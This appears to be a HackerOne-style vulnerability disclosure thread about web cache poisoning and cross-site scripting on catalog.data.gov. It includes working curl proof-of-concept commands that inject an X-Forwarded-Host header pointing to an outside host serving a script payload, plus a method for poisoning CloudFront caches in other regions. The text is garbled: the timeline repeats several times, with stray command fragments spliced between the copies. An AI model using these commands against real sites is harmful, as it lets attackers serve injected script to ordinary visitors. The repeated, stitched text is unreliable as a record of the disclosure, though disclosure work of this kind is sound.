My understanding is that part of this issue was inherited from the url_for function provided by the routes python library used with this codebase. I haven't seen this reported on other projects that use routes, but my understanding is that routes is a port of the rails routing functionality and it does look like a similar vulnerability has been reported for rails (also via HackerOne). You can see that vulnerability report here https://github.com/rails/rails/issues/29893
- **2018-08-08** @philipashlock: @albinowax We have addressed this vulnerability for the website it was reported for, but we are aware of other sites outside of our organization that are still vulnerable and whom we are coordinating with to remediate. We're aware that you are planning to present at the conference tomorrow but please be conscientious of the fact that we currently coordinating with other sites which we hope will be remediated soon, but it's unlikely they'll all be addressed before you are scheduled to present. As you can see by the issue on the Ruby on Rails repo, this is not only something that impacts many things using that framework, but even software projects in python like the one we use that incorporates a library ported from Rails. So this is likely a widespread issue.
- **2018-08-09** @albinowax: Thanks for the additional info, it's very interesting to see that this has sat in the public issue tracker for over a year. I am aware that the issue is widespread - I think this is largely due to poor awareness in the security community and lack of appreciation for how serious the consequences can be, which my presentation will hopefully help to fix.
- **2018-09-24** @albinowax: I think this issue could be marked as resolved now.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H 

- **Report Filed**
- **Report Needs More Info**
- **Report New**
- **2018-01-12** @albinowax: Here's an improved PoC that uses a timestamp to avoid caching issues:

1. Execute the following command
```url=https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=$(date +%s) && curl -i -s -k -H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' $url | fgrep portswigger && echo -e "\n\n$url"```

2. The previous step should print out a URL like https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=1515773700 on the last line. If you don't see the URL, something went wrong. Load the URL that gets printed in Chrome

3. Wait a few seconds for the alert
- **2018-01-13** @joystick: Hi,

Thank you for the additional information! We will investigate and get back to you as soon as we have an update to share.

Regards.
@joystick
- **2018-01-13** @joystick: We were able to replicate the issue and will now escalate to our internal team for further investigation. Thank you!
- **Report Severity Updated**
- **2018-01-13** @albinowax: Good to hear you've replicated it.

Just in case the logic behind the original critical severity isn't clear, it's that by tweaking the cURL command slightly it's possible to poison https://catalog.data.gov/dataset/consumer-complaint-database so that random visitors will get exploited. This technique can be used on *every* dataset, and also possibly every other page on catalog.data.gov (I'm working on that).
- **Report Severity Updated**
- **2018-01-13** @joystick: @albinowax - the complexity of the attack was set to `High` because Cloudfront would serve the cached response only to users from the same region as the attacker. Confidentiality is set to `Low` since there isn't much to any sensitive information to extract. Integrity was re-set to `High` given the fact that the injected JS might allow the attacker to override the page's content. However, the attack would still require user interaction, and as a result the overall CVSS is `High (7.4)`. If you have any additional information that would help us better assess this report, please let us know.
- **Report Triaged**
- **2018-01-25** @albinowax: The statement that the complexity of this attack is 'high' because Cloudfront would serve the cached response only to users from the same region as the attacker isn't entirely accurate.

An attacker can easily poison the cache in arbitrary regions by using a service like `https://www.nexcess.net/resources/tools/global-dns-checker/?h=catalog.data.gov&t=A` to get a list of CloudFront's frontends in different regions, then routing the attack through each of those in turn:

curl --resolve catalog.data.gov:443:54.230.9.199 -H $'x-forwarded-host: portswigger-labs.net/' https://catalog.data.gov/dataset/consumer-complaint-database?zxcv=1234

Cheers.
- **Report Severity Updated**
- **2018-01-31** @joystick: @albinowax - thank for the follow-up! we adjusted to the complexity to `High`.
- **Bounty Awarded**
- **2018-05-30** @albinowax: It looks like this vulnerability hasn't been fixed since I reported it several months ago. I should mention that I'm planning to deliver a talk on the underlying attack concept/technique at a major security conference (Black Hat USA) in a couple of month's time. Unfortunately after this point it's likely that other people will independently discover this vulnerability and potentially exploit it. As such, I really think it's worth resolving this issue promptly.
- **2018-05-30** @ericmillgsa: @albinowax Thanks for the poke, and the heads up. We'll investigate this internally and will update this thread.
- **2018-07-10** @ericmillgsa: @albinowax We've tested a fix to this issue, and are still in the process of deploying the fix to production, as we have had internal challenges that have made it difficult to do this as fast as we'd usually like. I don't have a specific ETA right now, but we're aware of the issue and understand that this issue will be publicly disclosed, and intend to have a fix deployed before that time. Thanks again for all the details you've given, and for the notice you've provided of your intent to disclose it.
- **2018-07-24** @ericmillgsa: @albinowax Just so you know, we're still tracking and aim to have this resolved soon.
- **2018-07-25** @albinowax: Thanks for the update. Is it safe to assume this will be resolved by the 9th August?
- **2018-07-25** @ericmillgsa: @albinowax Yes, that's our plan and we believe that's safe to assume.
- **2018-08-08** @hyonjkim: This has been resolved by the Data.gov team.
- **2018-08-08** @philipashlock: @albinowax For your awareness, this issue was fixed in the upstream codebase previously but had not been rolled out as part of our deployment until recently. The upstream fix was made here https://github.com/ckan/ckan/pull/2599

My understanding is that part of this issue was inherited from the url_for function provided by the routes python library used with this codebase. I haven't seen this reported on other projects that use routes, but my understanding is that routes is a port of the rails routing functionality and it does look like a similar vulnerability has been reported for rails (also via HackerOne). You can see that vulnerability report here https://github.com/rails/rails/issues/29893
- **2018-08-08** @philipashlock: @albinowax We have addressed this vulnerability for the website it was reported for, but we are aware of other sites outside of our organization that are still vulnerable and whom we are coordinating with to remediate. We're aware that you are planning to present at the conference tomorrow but please be conscientious of the fact that we currently coordinating with other sites which we hope will be remediated soon, but it's unlikely they'll all be addressed before you are scheduled to present. As you can see by the issue on the Ruby on Rails repo, this is not only something that impacts many things using that framework, but even software projects in python like the one we use that incorporates a library ported from Rails. So this is likely a widespread issue.
- **2018-08-09** @albinowax: Thanks for the additional info, it's very interesting to see that this has sat in the public issue tracker for over a year. I am aware that the issue is widespread - I think this is largely due to poor awareness in the security community and lack of appreciation for how serious the consequences can be, which my presentation will hopefully help to fix.
- **2018-09-24** @albinowax: I think this issue could be marked as resolved now.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H 

- **Report Filed**
- **Report Needs More Info**
- **Report New**
- **2018-01-12** @albinowax: Here's an improved PoC that uses a timestamp to avoid caching issues:

1. Execute the following command
```url=https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=$(date +%s) && curl -i -s -k -H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' $url | fgrep portswigger && echo -e "\n\n$url"```

2. The previous step should print out a URL like https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=1515773700 on the last line. If you don't see the URL, something went wrong. Load the URL that gets printed in Chrome

3. Wait a few seconds for the alert
- **2018-01-13** @joystick: Hi,

Thank you for the additional information! We will investigate and get back to you as soon as we have an update to share.

Regards.
@joystick
- **2018-01-13** @joystick: We were able to replicate the issue and will now escalate to our internal team for further investigation. Thank you!
- **Report Severity Updated**
- **2018-01-13** @albinowax: Good to hear you've replicated it.

Just in case the logic behind the original critical severity isn't clear, it's that by tweaking the cURL command slightly it's possible to poison https://catalog.data.gov/dataset/consumer-complaint-database so that random visitors will get exploited. This technique can be used on *every* dataset, and also possibly every other page on catalog.data.gov (I'm working on that).
- **Report Severity Updated**
- **2018-01-13** @joystick: @albinowax - the complexity of the attack was set to `High` because Cloudfront would serve the cached response only to users from the same region as the attacker. Confidentiality is set to `Low` since there isn't much to any sensitive information to extract. Integrity was re-set to `High` given the fact that the injected JS might allow the attacker to override the page's content. However, the attack would still require user interaction, and as a result the overall CVSS is `High (7.4)`. If you have any additional information that would help us better assess this report, please let us know.
- **Report Triaged**
- **2018-01-25** @albinowax: The statement that the complexity of this attack is 'high' because Cloudfront would serve the cached response only to users from the same region as the attacker isn't entirely accurate.

An attacker can easily poison the cache in arbitrary regions by using a service like `https://www.nexcess.net/resources/tools/global-dns-checker/?h=catalog.data.gov&t=A` to get a list of CloudFront's frontends in different regions, then routing the attack through each of those in turn:

curl --resolve catalog.data.gov:443:54.230.9.199 -H $'x-forwarded-host: portswigger-labs.net/' https://catalog.data.gov/dataset/consumer-complaint-database?zxcv=1234

Cheers.
- **Report Severity Updated**
- **2018-01-31** @joystick: @albinowax - thank for the follow-up! we adjusted to the complexity to `High`.
- **Bounty Awarded**
- **2018-05-30** @albinowax: It looks like this vulnerability hasn't been fixed since I reported it several months ago. I should mention that I'm planning to deliver a talk on the underlying attack concept/technique at a major security conference (Black Hat USA) in a couple of month's time. Unfortunately after this point it's likely that other people will independently discover this vulnerability and potentially exploit it. As such, I really think it's worth resolving this issue promptly.
- **2018-05-30** @ericmillgsa: @albinowax Thanks for the poke, and the heads up. We'll investigate this internally and will update this thread.
- **2018-07-10** @ericmillgsa: @albinowax We've tested a fix to this issue, and are still in the process of deploying the fix to production, as we have had internal challenges that have made it difficult to do this as fast as we'd usually like. I don't have a specific ETA right now, but we're aware of the issue and understand that this issue will be publicly disclosed, and intend to have a fix deployed before that time. Thanks again for all the details you've given, and for the notice you've provided of your intent to disclose it.
- **2018-07-24** @ericmillgsa: @albinowax Just so you know, we're still tracking and aim to have this resolved soon.
- **2018-07-25** @albinowax: Thanks for the update. Is it safe to assume this will be resolved by the 9th August?
- **2018-07-25** @ericmillgsa: @albinowax Yes, that's our plan and we believe that's safe to assume.
- **2018-08-08** @hyonjkim: This has been resolved by the Data.gov team.
- **2018-08-08** @philipashlock: @albinowax For your awareness, this issue was fixed in the upstream codebase previously but had not been rolled out as part of our deployment until recently. The upstream fix was made here https://github.com/ckan/ckan/pull/2599

My understanding is that part of this issue was inherited from the url_for function provided by the routes python library used with this codebase. I haven't seen this reported on other projects that use routes, but my understanding is that routes is a port of the rails routing functionality and it does look like a similar vulnerability has been reported for rails (also via HackerOne). You can see that vulnerability report here https://github.com/rails/rails/issues/29893
- **2018-08-08** @philipashlock: @albinowax We have addressed this vulnerability for the website it was reported for, but we are aware of other sites outside of our organization that are still vulnerable and whom we are coordinating with to remediate. We're aware that you are planning to present at the conference tomorrow but please be conscientious of the fact that we currently coordinating with other sites which we hope will be remediated soon, but it's unlikely they'll all be addressed before you are scheduled to present. As you can see by the issue on the Ruby on Rails repo, this is not only something that impacts many things using that framework, but even software projects in python like the one we use that incorporates a library ported from Rails. So this is likely a widespread issue.
- **2018-08-09** @albinowax: Thanks for the additional info, it's very interesting to see that this has sat in the public issue tracker for over a year. I am aware that the issue is widespread - I think this is largely due to poor awareness in the security community and lack of appreciation for how serious the consequences can be, which my presentation will hopefully help to fix.
- **2018-09-24** @albinowax: I think this issue could be marked as resolved now.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
Connection: close' \
    

- **Report Filed**
- **Report Needs More Info**
- **Report New**
- **2018-01-12** @albinowax: Here's an improved PoC that uses a timestamp to avoid caching issues:

1. Execute the following command
```url=https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=$(date +%s) && curl -i -s -k -H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' $url | fgrep portswigger && echo -e "\n\n$url"```

2. The previous step should print out a URL like https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=1515773700 on the last line. If you don't see the URL, something went wrong. Load the URL that gets printed in Chrome

3. Wait a few seconds for the alert
- **2018-01-13** @joystick: Hi,

Thank you for the additional information! We will investigate and get back to you as soon as we have an update to share.

Regards.
@joystick
- **2018-01-13** @joystick: We were able to replicate the issue and will now escalate to our internal team for further investigation. Thank you!
- **Report Severity Updated**
- **2018-01-13** @albinowax: Good to hear you've replicated it.

Just in case the logic behind the original critical severity isn't clear, it's that by tweaking the cURL command slightly it's possible to poison https://catalog.data.gov/dataset/consumer-complaint-database so that random visitors will get exploited. This technique can be used on *every* dataset, and also possibly every other page on catalog.data.gov (I'm working on that).
- **Report Severity Updated**
- **2018-01-13** @joystick: @albinowax - the complexity of the attack was set to `High` because Cloudfront would serve the cached response only to users from the same region as the attacker. Confidentiality is set to `Low` since there isn't much to any sensitive information to extract. Integrity was re-set to `High` given the fact that the injected JS might allow the attacker to override the page's content. However, the attack would still require user interaction, and as a result the overall CVSS is `High (7.4)`. If you have any additional information that would help us better assess this report, please let us know.
- **Report Triaged**
- **2018-01-25** @albinowax: The statement that the complexity of this attack is 'high' because Cloudfront would serve the cached response only to users from the same region as the attacker isn't entirely accurate.

An attacker can easily poison the cache in arbitrary regions by using a service like `https://www.nexcess.net/resources/tools/global-dns-checker/?h=catalog.data.gov&t=A` to get a list of CloudFront's frontends in different regions, then routing the attack through each of those in turn:

curl --resolve catalog.data.gov:443:54.230.9.199 -H $'x-forwarded-host: portswigger-labs.net/' https://catalog.data.gov/dataset/consumer-complaint-database?zxcv=1234

Cheers.
- **Report Severity Updated**
- **2018-01-31** @joystick: @albinowax - thank for the follow-up! we adjusted to the complexity to `High`.
- **Bounty Awarded**
- **2018-05-30** @albinowax: It looks like this vulnerability hasn't been fixed since I reported it several months ago. I should mention that I'm planning to deliver a talk on the underlying attack concept/technique at a major security conference (Black Hat USA) in a couple of month's time. Unfortunately after this point it's likely that other people will independently discover this vulnerability and potentially exploit it. As such, I really think it's worth resolving this issue promptly.
- **2018-05-30** @ericmillgsa: @albinowax Thanks for the poke, and the heads up. We'll investigate this internally and will update this thread.
- **2018-07-10** @ericmillgsa: @albinowax We've tested a fix to this issue, and are still in the process of deploying the fix to production, as we have had internal challenges that have made it difficult to do this as fast as we'd usually like. I don't have a specific ETA right now, but we're aware of the issue and understand that this issue will be publicly disclosed, and intend to have a fix deployed before that time. Thanks again for all the details you've given, and for the notice you've provided of your intent to disclose it.
- **2018-07-24** @ericmillgsa: @albinowax Just so you know, we're still tracking and aim to have this resolved soon.
- **2018-07-25** @albinowax: Thanks for the update. Is it safe to assume this will be resolved by the 9th August?
- **2018-07-25** @ericmillgsa: @albinowax Yes, that's our plan and we believe that's safe to assume.
- **2018-08-08** @hyonjkim: This has been resolved by the Data.gov team.
- **2018-08-08** @philipashlock: @albinowax For your awareness, this issue was fixed in the upstream codebase previously but had not been rolled out as part of our deployment until recently. The upstream fix was made here https://github.com/ckan/ckan/pull/2599

My understanding is that part of this issue was inherited from the url_for function provided by the routes python library used with this codebase. I haven't seen this reported on other projects that use routes, but my understanding is that routes is a port of the rails routing functionality and it does look like a similar vulnerability has been reported for rails (also via HackerOne). You can see that vulnerability report here https://github.com/rails/rails/issues/29893
- **2018-08-08** @philipashlock: @albinowax We have addressed this vulnerability for the website it was reported for, but we are aware of other sites outside of our organization that are still vulnerable and whom we are coordinating with to remediate. We're aware that you are planning to present at the conference tomorrow but please be conscientious of the fact that we currently coordinating with other sites which we hope will be remediated soon, but it's unlikely they'll all be addressed before you are scheduled to present. As you can see by the issue on the Ruby on Rails repo, this is not only something that impacts many things using that framework, but even software projects in python like the one we use that incorporates a library ported from Rails. So this is likely a widespread issue.
- **2018-08-09** @albinowax: Thanks for the additional info, it's very interesting to see that this has sat in the public issue tracker for over a year. I am aware that the issue is widespread - I think this is largely due to poor awareness in the security community and lack of appreciation for how serious the consequences can be, which my presentation will hopefully help to fix.
- **2018-09-24** @albinowax: I think this issue could be marked as resolved now.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6' > /dev/null

2. Visit the poisoned page:
https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6

3. Wait for a few seconds, and observe the popup caused by our injected alert(document.domain)

Behind the scenes, step 1 poisons the cache with a data-site-root value of 'portswigger-labs.net/catalog.data.gov_json_xss/json.php'. In step 2, some JavaScript fetches our json.php file from portswigger-labs.net, and uses our 'show more' JSON attribute to translate the 'show more' text on https://catalog.data.gov/dataset/consumer-complaint-database into "Mostrar más <svg onload=alert(document.domain)>"

This is the offending line of JavaScript:
var template_more = ['<tr class="toggle-show toggle-show-more">', '<td colspan="' + cols + '">', '<small>', '<a href="#" class="show-more">' + this.i18n('show_more') + '</a>', '<a href="#" class="show-less">' + this.i18n('show_less') + '</a>', '</small>', '</td>', '</tr>'].join('\n');

To mitigate this issue, I recommend addressing the X-Forwarded-Host reflection. 

Please let me know if you have any questions.

Cheers,

James & Gareth

## Impact

An attacker can deface most pages on catalog.data.gov.

## Timeline

- **Report Filed**
- **Report Needs More Info**
- **Report New**
- **2018-01-12** @albinowax: Here's an improved PoC that uses a timestamp to avoid caching issues:

1. Execute the following command
```url=https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=$(date +%s) && curl -i -s -k -H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' $url | fgrep portswigger && echo -e "\n\n$url"```

2. The previous step should print out a URL like https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=1515773700 on the last line. If you don't see the URL, something went wrong. Load the URL that gets printed in Chrome

3. Wait a few seconds for the alert
- **2018-01-13** @joystick: Hi,

Thank you for the additional information! We will investigate and get back to you as soon as we have an update to share.

Regards.
@joystick
- **2018-01-13** @joystick: We were able to replicate the issue and will now escalate to our internal team for further investigation. Thank you!
- **Report Severity Updated**
- **2018-01-13** @albinowax: Good to hear you've replicated it.

Just in case the logic behind the original critical severity isn't clear, it's that by tweaking the cURL command slightly it's possible to poison https://catalog.data.gov/dataset/consumer-complaint-database so that random visitors will get exploited. This technique can be used on *every* dataset, and also possibly every other page on catalog.data.gov (I'm working on that).
- **Report Severity Updated**
- **2018-01-13** @joystick: @albinowax - the complexity of the attack was set to `High` because Cloudfront would serve the cached response only to users from the same region as the attacker. Confidentiality is set to `Low` since there isn't much to any sensitive information to extract. Integrity was re-set to `High` given the fact that the injected JS might allow the attacker to override the page's content. However, the attack would still require user interaction, and as a result the overall CVSS is `High (7.4)`. If you have any additional information that would help us better assess this report, please let us know.
- **Report Triaged**
- **2018-01-25** @albinowax: The statement that the complexity of this attack is 'high' because Cloudfront would serve the cached response only to users from the same region as the attacker isn't entirely accurate.

An attacker can easily poison the cache in arbitrary regions by using a service like `https://www.nexcess.net/resources/tools/global-dns-checker/?h=catalog.data.gov&t=A` to get a list of CloudFront's frontends in different regions, then routing the attack through each of those in turn:

curl --resolve catalog.data.gov:443:54.230.9.199 -H $'x-forwarded-host: portswigger-labs.net/' https://catalog.data.gov/dataset/consumer-complaint-database?zxcv=1234

Cheers.
- **Report Severity Updated**
- **2018-01-31** @joystick: @albinowax - thank for the follow-up! we adjusted to the complexity to `High`.
- **Bounty Awarded**
- **2018-05-30** @albinowax: It looks like this vulnerability hasn't been fixed since I reported it several months ago. I should mention that I'm planning to deliver a talk on the underlying attack concept/technique at a major security conference (Black Hat USA) in a couple of month's time. Unfortunately after this point it's likely that other people will independently discover this vulnerability and potentially exploit it. As such, I really think it's worth resolving this issue promptly.
- **2018-05-30** @ericmillgsa: @albinowax Thanks for the poke, and the heads up. We'll investigate this internally and will update this thread.
- **2018-07-10** @ericmillgsa: @albinowax We've tested a fix to this issue, and are still in the process of deploying the fix to production, as we have had internal challenges that have made it difficult to do this as fast as we'd usually like. I don't have a specific ETA right now, but we're aware of the issue and understand that this issue will be publicly disclosed, and intend to have a fix deployed before that time. Thanks again for all the details you've given, and for the notice you've provided of your intent to disclose it.
- **2018-07-24** @ericmillgsa: @albinowax Just so you know, we're still tracking and aim to have this resolved soon.
- **2018-07-25** @albinowax: Thanks for the update. Is it safe to assume this will be resolved by the 9th August?
- **2018-07-25** @ericmillgsa: @albinowax Yes, that's our plan and we believe that's safe to assume.
- **2018-08-08** @hyonjkim: This has been resolved by the Data.gov team.
- **2018-08-08** @philipashlock: @albinowax For your awareness, this issue was fixed in the upstream codebase previously but had not been rolled out as part of our deployment until recently. The upstream fix was made here https://github.com/ckan/ckan/pull/2599

My understanding is that part of this issue was inherited from the url_for function provided by the routes python library used with this codebase. I haven't seen this reported on other projects that use routes, but my understanding is that routes is a port of the rails routing functionality and it does look like a similar vulnerability has been reported for rails (also via HackerOne). You can see that vulnerability report here https://github.com/rails/rails/issues/29893
- **2018-08-08** @philipashlock: @albinowax We have addressed this vulnerability for the website it was reported for, but we are aware of other sites outside of our organization that are still vulnerable and whom we are coordinating with to remediate. We're aware that you are planning to present at the conference tomorrow but please be conscientious of the fact that we currently coordinating with other sites which we hope will be remediated soon, but it's unlikely they'll all be addressed before you are scheduled to present. As you can see by the issue on the Ruby on Rails repo, this is not only something that impacts many things using that framework, but even software projects in python like the one we use that incorporates a library ported from Rails. So this is likely a widespread issue.
- **2018-08-09** @albinowax: Thanks for the additional info, it's very interesting to see that this has sat in the public issue tracker for over a year. I am aware that the issue is widespread - I think this is largely due to poor awareness in the security community and lack of appreciation for how serious the consequences can be, which my presentation will hopefully help to fix.
- **2018-09-24** @albinowax: I think this issue could be marked as resolved now.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
